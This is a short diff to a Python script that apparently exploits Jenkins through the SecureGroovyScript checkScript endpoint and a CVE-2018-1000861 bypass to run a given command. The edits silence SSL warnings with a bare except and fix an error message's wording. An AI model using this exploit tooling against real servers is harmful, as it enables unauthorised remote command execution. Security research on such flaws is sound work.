@@ -6,8 +6,12 @@
 import sys
 import requests
 from enum import Enum
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+# remove bad SSL warnings
+try:
+    requests.packages.urllib3.disable_warnings()
+except:
+    pass
 
 
 endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
@@ -105,4 +109,4 @@ if __name__ == '__main__':
         _log('Bypass with CVE-2018-1000861!')
         exploit(_add_bypass(url), cmd)
     else:
-        _log('The `checkScript` is not found, please you try other entries(see refs)', fail=True)
+        _log('The `checkScript` is not found, please try other entries(see refs)', fail=True)
